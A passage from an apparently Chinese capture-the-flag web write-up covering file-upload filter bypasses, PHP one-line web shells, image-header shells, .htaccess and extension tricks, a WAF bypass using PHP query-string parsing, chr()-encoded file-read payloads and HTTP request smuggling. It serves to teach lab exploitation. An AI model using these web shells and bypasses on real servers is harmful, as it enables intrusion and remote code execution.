   	<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>  
   		<span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font:20px Georgia,serif;&quot;</span>&gt;</span>图片：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
   		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> &gt;</span>
  			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>
  		<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
<h4 id="html知识">html知识</h4>
<p><strong><em>div标签定义 HTML
文档中的分隔（DIVision）或部分（section），表示一块</em></strong></p>
<p><strong><em>align是对齐属性，center：居中对齐</em></strong></p>
<p><strong><em>action
属性规定当提交表单时，向何处发送表单数据。</em></strong></p>
<p>上传文件到upload_file.php，文件表单名叫file</p>
<ol type="1">
<li>试试上传一句话木马shell.php，发现不行，返回Not
image!，前端对后缀名有限制</li>
</ol>
<pre><code class="hljs php">Content-Type: application/octet-stream
<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
<ol start="2" type="1">
<li><p>改成shell.php.jpg也不行，改mime:image/jpeg也不行，说明后端对文件头有限制</p></li>
<li><p>上传图片马，发现对<?有过滤

- **==标签绕过==**：`<script language=php>
eval($_POST['c']);`</p>
<ul>
<li>``<code>标准标签：&lt;?php   简写标签  &lt;?=    它是 &lt;?php echo 的简写形式,（无需闭合尾巴）   短标记(&lt;? xxx ?&gt;)，需开启([short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag)in php.ini)   asp标签(&lt;%xxx%&gt;)【禁用了&lt;?、 &lt;?php、 ?&gt;时】需开启（asp_tags）   &lt;script language=php&gt;echo  ‘123’;&lt;/script&gt; 这里不存在&lt;?，可以绕过正则对&lt;? ,&lt;?php，asp的限制   注意⚠️php&gt;7废除了asp标签和script标签   <pre><code class="hljs xml">
4. 成功上传shell.jpg，但怎么让他解析呢?此法不行，后面上传.htaccess也不行，必须内容是图片开头，说明还是后缀解析问题
5. <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:#bbffff;&quot;</span>&gt;</span>**默认后缀php解析**<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
</code></pre> ⚠默认后缀解析  phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀 php2, php3, php4, php5, phps, pht, phtm, phtml <pre><code class="hljs routeros">
修改后缀php2，php3.。都不行

**修改上传文件的类型为phtml，只有这样才能使网页后端执行我们的一句话木马**

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230412016.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230412016&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:67%;&quot;</span> /&gt;



精简版：

**这题的绕过点有三个，一个就是文件内容不能有&lt;?，还有就是文件后缀的绕过，还有图片头。**
</code></pre> GIF89a? &lt;script language="php"&gt;eval($_POST[c])&lt;/script&gt; <pre><code class="hljs routeros">
还有一个问题就是**上传之后的文件在哪**。**&lt;span <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background:#FF9999;&quot;</span>&gt;猜测还是常规的目录/upload下面&lt;/span&gt;**

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230719900.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230719900&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;

访问11.phtml失败，说明位置不对，GET访问upload/11.phtml成功，显示图片源码

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224630667.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224630667&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;

POST访问，成功

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224720182.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224720182&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;

payload：POST：upload/11.phtml，POST：
</code></pre> c=echo</code>cat
/flag`; <pre><code class="hljs">




## [ACTF2020 新生赛]Upload

### 考点：php常见后缀解析绕过

&gt; [参考WP](https://www.cnblogs.com/yesec/p/12403922.html)

查看源码

```html
 &lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;
			&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;
				嘿伙计，你发现它了！
                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;
                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;
            &lt;/form&gt;
      &lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</code></pre></li>
</ul></li>
</ol>
<p><strong><em><a target="_blank" rel="noopener" href="https://blog.csdn.net/YoungStar70/article/details/64934435">onsubmit</a>表示表单提交时验证的事件,它是在表单中的确认按钮被点击时出发的，一般是js函数，函数返回其他值/不返回表单内容才能提交，函数返回false表单不会提交</em></strong>（<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/111968742.html">百度知道</a>）</p>
<p>前端对文件后缀有限制，审查元素删掉也不行</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214154853790.png" srcset="/img/loading.gif" alt="image-20220214154853790" style="zoom: 50%;"></p>
<p>上传图片马，发现对上传后的文件重命名了</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214155009513.png" srcset="/img/loading.gif" alt="image-20220214155009513" style="zoom: 67%;"></p>
<p>直接访问，发现是图片</p>
<p>修改后缀名为11.phtml，上传成功，访问网页成功解析php</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163807480.png" srcset="/img/loading.gif" alt="image-20220214163807480" style="zoom:67%;"></p>
<p>POST访问uplo4d/87226c8336e7d8806fd8d3324fbcda6b.phtml</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">c</span>=echo <span class="hljs-string">`cat  /flag`</span>;</code></pre>
<p>得到flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163848001.png" srcset="/img/loading.gif" alt="image-20220214163848001" style="zoom: 50%;"></p>
<p>蚁剑连接后查看源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    error_reporting(<span class="hljs-number">0</span>);
    <span class="hljs-comment">//设置上传目录</span>
    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;./uplo4d&quot;</span>);
    $msg = <span class="hljs-string">&quot;Upload Success!&quot;</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        $ext = pathinfo($file_name,PATHINFO_EXTENSION);  <span class="hljs-comment">//规定新的文件后缀名为源文件后缀名</span>
        <span class="hljs-keyword">if</span>(in_array($ext, [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>])) &#123;   <span class="hljs-comment">//这里不出所料,过滤了常见的php文件拓展名</span>
            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;nonono~ Bad file！&#x27;</span>);
        &#125;

        $new_file_name = md5($file_name).<span class="hljs-string">&quot;.&quot;</span>.$ext;    <span class="hljs-comment">//新的文件名为md5值加上后缀名</span>
        $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $new_file_name;


        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;
            $is_upload = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">&#x27;Upload Failed!&#x27;</span>;
        &#125;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.$msg.<span class="hljs-string">&quot; Look here~ &quot;</span>.$img_path.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;
    &#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<blockquote>
<p><strong><em><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfo()</a>
函数以数组的形式返回关于文件路径的信息。</em></strong></p>
<p>语法：pathinfo(path,options)，opyions里的PATHINFO_EXTENSION - 只返回
extension</p>
</blockquote>
<p>从源码中可以看出只对上传后的文件更名并移到upload目录下，并没有删除</p>
<h4 id="总结一下ctf文件上传题中常见考点">总结一下CTF文件上传题中常见考点</h4>
<ul>
<li>利用中间件解析漏洞绕过检查，实战常用</li>
<li>上传.user.ini或.htaccess将合法拓展名文件当作php文件解析</li>
<li>%00截断绕过</li>
<li>php3后缀解析</li>
<li>php4文件</li>
<li>php5文件</li>
<li>php7文件</li>
<li>phtml文件</li>
<li>phps文件</li>
<li>pht文件</li>
</ul>
<h2 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h2>
<h3 id="考点.htaccessmime后缀">考点：.htaccess、mime+后缀</h3>
<p>上传一句话，图片马都不行，后端验证</p>
<p>那就上传.htaccess文件，<strong>==修改mime为
image/jpeg==</strong>，发现成功上传，这样就可以让 <strong>jpg</strong>
解析为 <strong>php</strong></p>
<blockquote>
<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">htaccess</a>文件是Apache服务器中的一个配置文件，它负责所在目录下的网页解析配置</strong></p>
<p><strong>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，且子目录中的指令会覆盖父目录或者主配置文件中的指令</strong></p>
</blockquote>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214174709873.png" srcset="/img/loading.gif" alt="image-20220214174709873" style="zoom:67%;"></p>
<p>上传一个一句话木马php文件</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175230427.png" srcset="/img/loading.gif" alt="image-20220214175230427" style="zoom: 80%;"></p>
<p>修改后缀、mime，成功上传</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175305517.png" srcset="/img/loading.gif" alt="image-20220214175305517" style="zoom:67%;"></p>
<p>成功访问</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175337259.png" srcset="/img/loading.gif" alt="image-20220214175337259" style="zoom: 50%;"></p>
<p>蚁剑连接得到flag，不知道为啥直接hackbar shell=echo `cat /flag`
不行</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175930523.png" srcset="/img/loading.gif" alt="image-20220214175930523" style="zoom:67%;"></p>
<p>源码分析，对后缀有限制：含ph就不行，对文件类型即mime有限制，得是image类，对大小也有限制，然后就直接输出文件内容，把上传的文件移动到新目录下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
session_start();
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;
    $_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>] = md5((<span class="hljs-keyword">string</span>)time() . (<span class="hljs-keyword">string</span>)rand(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>));
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>])) &#123;
    $target_path  = getcwd() . <span class="hljs-string">&quot;/upload/&quot;</span> . md5($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]);  <span class="hljs-comment">//getcwd在这里是/var/www/html</span>
    $t_path = $target_path . <span class="hljs-string">&quot;/&quot;</span> . basename($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//$t_path是/var/www/html+md5+文件名</span>
    $uploaded_name = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];  <span class="hljs-comment">//文件全名，包含后缀</span>
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);  <span class="hljs-comment">//后缀为最后一个点后面的</span>
    $uploaded_size = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];
    $uploaded_tmp  = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
 
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>, strtolower($uploaded_ext)))&#123;  <span class="hljs-comment">//不区分大小写，遇到含ph的后缀就die</span>
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我扌your problem?&quot;</span>);
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">if</span> ((($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;</span>
<span class="hljs-string">            &quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>)|| ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>)) &amp;&amp; ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">2048</span>))&#123;
            $content = file_get_contents($uploaded_tmp);  <span class="hljs-comment">//输出临时文件内容</span>
			mkdir(iconv(<span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;GBK&quot;</span>, $target_path), <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
			move_uploaded_file($uploaded_tmp, $t_path);  <span class="hljs-comment">//移动临时文件到/var/www/html+md5+文件</span>
			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我扌your problem?&quot;</span>);
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>getcwd():获取当前目录，在这里是/var/www/html</p>
<p>getcwd()返回URL中引用的“main”脚本的路径。</p>
<p>dirname(<strong>FILE</strong>)将返回当前执行脚本的路径。</p>
<p><strong><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415346.html">basename()</a>函数用于返回文件路径中的文件名部分</strong></p>
<ul>
<li><p>$file = "/phpstudy/WWW/index.php";</p></li>
<li><p>echo basename($file);//带有文件扩展名 index.php</p></li>
<li><p>echo basename($file,'.php'); //去除文件扩展名 index</p></li>
</ul>
<p>strrpos()
函数查找字符串在另一字符串中<strong>最后一次</strong>出现的位置（区分大小写）</p>
<p>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>
<p>substr() 函数返回字符串第二个参数开始（包括）的后半部分。</p>
<p>文件上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。</p>
<h2 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h2>
<h3 id="考点phpwaf字符串解析特性绕过php扫目录scandir读文件readfile编码绕过ascii">考点：php+waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102630714">csdn
wp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">参考个人博客wp</a></p>
</blockquote>
<p>输入字符被403</p>
<p><strong>返回403？一般都是PHP过滤的。这里403.应该就是题目说的WAF了</strong>
<strong>那么整个处理流程应该是。前端服务器WAF过滤。-&gt;后端PHP黑名单过滤</strong></p>
<p>查看源码</p>
<pre><code class="hljs javascript">$(<span class="hljs-string">&#x27;#calc&#x27;</span>).submit(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
    $.ajax(&#123;
        url:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).val()), <span class="hljs-comment">//获取标签的值并进行url编码</span>
        type:<span class="hljs-string">&#x27;GET&#x27;</span>,
        success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;
            $(<span class="hljs-string">&quot;#result&quot;</span>).html(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span>
<span class="hljs-string">        &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span>
<span class="hljs-string">        &lt;/div&gt;`</span>);
        &#125;,
        error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
            alert(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);
        &#125;
    &#125;)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;)</code></pre>
<p>calc.php?num=”+encodeURIComponent($(“#content”).val()是什么意思？</p>
<p>("#content")相当于document.getElementById("content");获取id为content的HTML标签元素</p>
<p>而(“#content”).val()
相当于document.getElementById(“content”).value;获取id为content的HTML标签元素的值</p>
<p>encodeURIComponent(str);将字符串url编码</p>
<p>访问calc.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//num没有值就返回calc源码</span>
&#125;<span class="hljs-keyword">else</span>&#123;
        $str = $_GET[<span class="hljs-string">&#x27;num&#x27;</span>];
        $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];
        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $str)) &#123;
                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);
                &#125;
        &#125;
        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$str.<span class="hljs-string">&#x27;;&#x27;</span>);  <span class="hljs-comment">//已有echo</span>
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>正则表达式模式修饰符 m：多行匹配，不受</p>
<p>尝试字母，forbidden，<strong>特殊字符好像就直接页面错误，，这应该是waf！！！</strong></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214213717838.png" srcset="/img/loading.gif" alt="image-20220214213717838" style="zoom:67%;"></p>
<h4 id="php的字符串解析特性">PHP的字符串解析特性</h4>
<ol type="1">
<li><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：/?foo=bar变成Array([foo]
=&gt;
“bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id]
=&gt; 42)。</p></li>
<li><p>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42"+AND+1=0–</code>(<strong>waf识别出参数是%20news[id%00而不是目标参数而不去拦截，实际到php那里，参数是news_id</strong>)</p></li>
<li><p>php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p></li>
</ol>
<pre><code class="hljs angelscript"><span class="hljs-number">1.</span>删除空白符

<span class="hljs-number">2.</span>将某些字符转换为下划线（包括空格）</code></pre>
<ol start="4" type="1">
<li>那么如果waf不允许num变量传递字母：</li>
</ol>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com<span class="hljs-regexp">/index.php?num = aaaa   /</span><span class="hljs-regexp">/显示非法输入的话</span></code></pre>
<p>那么我们可以在num前加个空格：</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com/index.php? num = aaaa</code></pre>
<p>waf以为是 num参数而不去拦截，而php解析出num参数赋值</p>
<p>、==》成功绕过waf</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214215614832.png" srcset="/img/loading.gif" alt="image-20220214215614832" style="zoom:67%;"></p>
<p>scandir()：函数返回一个数组，其中包含指定路径中的文件和目录，不会回显</p>
<p>==需要配合<strong>print_r</strong>或<strong>var_dump</strong>输出数组==</p>
<p><strong>由于“/”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取</strong>【/的ASCII:47】</p>
<p>payload：</p>
<ol type="1">
<li>读取根目录</li>
</ol>
<pre><code class="hljs reasonml">/calc.php? num=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">chr</span>(47)</span>));</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214230658219.png" srcset="/img/loading.gif" alt="image-20220214230658219"></p>
<ol start="2" type="1">
<li>读取flag？屏蔽了``，不能命令执行，php读文件函数：<strong>file_get_contents</strong></li>
</ol>
<ul>
<li><strong><em>file_get_contents()
把整个文件内容读入一个字符串中。<span style="background:#FF9999;">函数返回读取到的数据，</span></em></strong>，而原php代码已有echo，无需再打印</li>
<li><strong>PHP使用 标准的 点 连接符拼接</strong></li>
<li>payload:</li>
</ul>
<pre><code class="hljs angelscript">/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)));
/calc.php?%<span class="hljs-number">20</span>num=file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>));
即file_get_contents(/f1agg)</code></pre>
<p>或者</p>
<p>scandir可以用base_convert函数构造，但是利用base_convert只能解决<code>a~z</code>的利用，因为根目录需要/符号，且不在<code>a~z</code>,所以需要hex2bin(dechex(47))这种构造方式，dechex()函数把十进制数转换为十六进制数。hex2bin()函数把十六进制值的字符串转换为
ASCII字符,用readfile读取文件</p>
<ul>
<li><em><strong>readfile()函数: 输出一个文件。</strong>
<strong>该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回
false。您可以通过 <span class="citation" data-cites="readfile">@readfile</span>()
形式调用该函数，来隐藏错误信息。</strong></em></li>
</ul>
<p>payload:</p>
<pre><code class="hljs angelscript">base_convert(<span class="hljs-number">2146934604002</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(hex2bin(dechex(<span class="hljs-number">47</span>)).base_convert(<span class="hljs-number">25254448</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>))
即readfile(/f1agg)</code></pre>
<p>Q1：其他的函数如system执行系统命令可以吗？不行，因为phpinfo里可以看到禁用了<strong>system、exec
这一类命令执行的函数</strong></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214232523093.png" srcset="/img/loading.gif" alt="image-20220214232523093"></p>
<h4 id="q2http走私攻击">Q2：HTTP走私攻击</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">**协议层的攻击——HTTP请求走私，seebug介绍</a></p>
<p><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/01/24/RoarCTF-2019-Easy-Calc/">相关WP1</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/4e7t6Raji/">WP2</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/AQdKm74xy/">**各分类介绍和例题</a></p>
</blockquote>
<p><strong>TE-CL</strong></p>
<p>前端根据TE来解析。所有请求都被算上了 后端根据CL来解析。22。GET
/admin就成了新的请求</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/1579173913376.png" srcset="/img/loading.gif"></p>
<p><strong>CL-CL</strong></p>
<p>当代理服务器和后端服务器接收多个CL。返回400错误。代理服务器使用第一个CL处理数据。后端服务器使用第二个CL处理数据【<strong>数据到达服务器端</strong>】</p>
<p>这里GET/POST都可以</p>
<p><img src="https://guokeya.github.io/post-images/1579177518794.png" srcset="/img/loading.gif"></p>
<p><img src="https://pic.downk.cc/item/5e2968b82fb38b8c3c43771b.jpg" srcset="/img/loading.gif" alt="大佬图片"></p>
<p>CL-CL：在这题大概意思是一个消息同时加上两个Content-Length，POST请求+GET请求url参数，会导致400报错，前端接受的是POST请求，但是get请求到了后端，服务器端会回显get结果</p>
<p>Q3:字符串转ASCII，php：不能直接转，除非工具，需要挨个字符转，chr()，再<code>.</code>连接起来</p>
<blockquote>
<p>https://evilcos.me/lab/xssor/</p>
</blockquote>
<p>先转10en，再替换,为).chr(</p>
<h2 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h2>
<h3 id="考点备份php反序列化跳过__wakeup">考点：备份、php反序列化、跳过__wakeup()</h3>
<p><span style="background:#FF9999;">属性个数的值大于实际属性个数时，会跳过
__wakeup()函数的执行</span></p>
<p>提示网站备份，访问www.zip，得到源码和假flag</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35599248/article/details/119396936">dirsearch</a>参数解析</p>
<pre><code class="hljs diff"><span class="hljs-deletion">-i         保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)</span>
<span class="hljs-deletion">-w,--wordlists              自定义wordlist(以逗号分隔</span>
<span class="hljs-deletion">-e,--extensions             包含的文件拓展名(逗号分隔) /指定网站语言  如-e php,asp</span>
<span class="hljs-deletion">-u,--url                    目标url</span></code></pre>
<p>index.php关键php：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;
$select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];
